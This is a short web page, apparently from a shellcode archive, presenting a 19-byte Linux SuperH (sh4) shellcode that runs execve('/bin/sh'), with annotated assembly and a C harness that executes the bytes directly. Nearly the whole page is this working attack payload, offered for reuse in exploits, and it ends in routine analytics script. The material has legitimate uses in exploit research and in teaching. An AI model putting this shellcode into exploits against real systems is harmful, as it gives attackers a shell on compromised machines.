<html><head><title>Linux/SuperH - sh4 execve(/bin/sh, 0, 0) - 19 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 | Title:     Linux/SuperH - sh4 execve(&quot;/bin/sh&quot;, 0, 0) - 19 bytes
 | Date:      2011-06-22
 | Tested on: Debian-sh4 2.6.32-5-sh7751r
 | Author:    Florian Gaultier - agix - twitter: @Agixid
 |
 | http://shell-storm.org
*/

#include &lt;string.h&gt;
#include &lt;stdio.h&gt;

int main(){
char shell[] =
		&quot;\x0b\xe3&quot;//           mov     #11,r3
		&quot;\x02\xc7&quot;//           mova    @(10,pc),r0
		&quot;\x03\x64&quot;//           mov     r0,r4
		&quot;\x5a\x25&quot;//           xor     r5,r5
		&quot;\x6a\x26&quot;//           xor     r6,r6
		&quot;\x02\xc3&quot;//           trapa   #2
		&quot;/bin/sh&quot;;

printf(&quot;[*] Taille du ShellCode = %d\n&quot;, strlen(shell));
(*(void (*)()) shell)();

return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
